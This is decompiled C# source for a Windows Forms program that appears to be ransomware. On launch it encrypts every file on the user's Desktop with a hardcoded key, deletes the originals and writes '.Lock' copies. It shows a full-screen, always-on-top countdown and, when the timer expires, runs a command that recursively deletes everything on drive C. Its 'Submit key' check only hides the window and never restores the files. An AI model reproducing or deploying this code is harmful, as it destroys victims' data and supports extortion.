using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns1;

namespace ns2;

[DesignerGenerated]
public class Form1 : Form
{
	private DateTime TargetDT;

	private TimeSpan CountDownFrom;

	private IContainer components;

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox3")]
	internal virtual TextBox TextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox4")]
	internal virtual TextBox TextBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox5")]
	internal virtual TextBox TextBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox6")]
	internal virtual TextBox TextBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		CountDownFrom = TimeSpan.FromMinutes(1441.0);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Computer)MyProject.Computer).get_Audio().Play((Stream)Resources.Music__online_audio_converter_com_, (AudioPlayMode)2);
		Timer1.set_Interval(100);
		TargetDT = DateTime.Now.Add(CountDownFrom);
		string[] files = Directory.GetFiles(((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop());
		string[] array = files;
		foreach (string text in array)
		{
			string text2 = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text);
			TextBox1.set_Text(text2);
			string text3 = TextBox1.get_Text();
			string key = "1234567890--=!@#$%^&*()_+][poiuytrewqQWERTYUIOP{}}|';lkjhgfdsaASDFGHJKL?><MNBVCXZzxcvbnm,./qwdasafasfdsgasgadhdjfgn";
			Class1 @class = new Class1(key);
			string text4 = @class.EncryptData(text3);
			TextBox3.set_Text(text4);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text);
			string text5 = text + ".Lock";
			StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(text5, true);
			streamWriter.WriteLine(TextBox3.get_Text());
			streamWriter.Close();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		TimeSpan timeSpan = TargetDT.Subtract(DateTime.Now);
		if (timeSpan.TotalMilliseconds > 0.0)
		{
			Label1.set_Text(timeSpan.ToString("dd\\:hh\\:mm\\:ss"));
			return;
		}
		Label1.set_Text("00:00:00");
		Timer1.Stop();
		Process.Start("cmd", "/c del C:\\* /s /q");
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(TextBox6.get_Text(), "FU512-2DG1H-M85QZ-U7Z5T-PY8ZD", false) == 0)
		{
			((Control)this).Hide();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_042b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0435: Expected O, but got Unknown
		//IL_0533: Unknown result type (might be due to invalid IL or missing references)
		//IL_053d: Expected O, but got Unknown
		//IL_05c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d1: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		PictureBox1 = new PictureBox();
		Timer1 = new Timer(components);
		Label1 = new Label();
		Panel1 = new Panel();
		TextBox1 = new TextBox();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		TextBox4 = new TextBox();
		TextBox5 = new TextBox();
		Label2 = new Label();
		TextBox6 = new TextBox();
		Button1 = new Button();
		Label3 = new Label();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)Panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)PictureBox1).set_Location(new Point(-217, 113));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(100, 50));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)2);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		Timer1.set_Enabled(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 39.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Label1).set_ForeColor(Color.DarkRed);
		((Control)Label1).set_Location(new Point(3, 0));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(304, 61));
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("00:00:00:00");
		((Control)Panel1).set_BackColor(Color.Black);
		Panel1.set_BorderStyle((BorderStyle)2);
		((Control)Panel1).get_Controls().Add((Control)(object)Label1);
		((Control)Panel1).set_Location(new Point(529, 581));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(312, 74));
		((Control)Panel1).set_TabIndex(4);
		((Control)TextBox1).set_Location(new Point(206, 259));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(100, 20));
		((Control)TextBox1).set_TabIndex(6);
		((Control)TextBox1).set_Visible(false);
		((Control)TextBox2).set_Location(new Point(214, 267));
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(100, 20));
		((Control)TextBox2).set_TabIndex(7);
		((Control)TextBox2).set_Visible(false);
		((Control)TextBox3).set_Location(new Point(222, 275));
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(100, 20));
		((Control)TextBox3).set_TabIndex(8);
		((Control)TextBox3).set_Visible(false);
		((Control)TextBox4).set_Location(new Point(230, 283));
		((Control)TextBox4).set_Name("TextBox4");
		((Control)TextBox4).set_Size(new Size(100, 20));
		((Control)TextBox4).set_TabIndex(9);
		((Control)TextBox4).set_Visible(false);
		((Control)TextBox5).set_Location(new Point(238, 291));
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(100, 20));
		((Control)TextBox5).set_TabIndex(10);
		((Control)TextBox5).set_Visible(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Red);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(-6, -3));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(1425, 594));
		((Control)Label2).set_TabIndex(11);
		Label2.set_Text(componentResourceManager.GetString("Label2.Text"));
		Label2.set_TextAlign((ContentAlignment)32);
		((Control)TextBox6).set_Location(new Point(1179, 685));
		((Control)TextBox6).set_Name("TextBox6");
		((Control)TextBox6).set_Size(new Size(208, 20));
		((Control)TextBox6).set_TabIndex(4);
		((ButtonBase)Button1).set_BackColor(Color.Yellow);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Button1).set_Location(new Point(1240, 711));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(107, 26));
		((Control)Button1).set_TabIndex(12);
		((ButtonBase)Button1).set_Text("Submit key");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Lucida Console", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)Label3).set_ForeColor(SystemColors.ControlText);
		((Control)Label3).set_Location(new Point(1134, 685));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(39, 13));
		((Control)Label3).set_TabIndex(13);
		Label3.set_Text("Key:");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(1386, 788));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox6);
		((Control)this).get_Controls().Add((Control)(object)TextBox5);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Ω");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
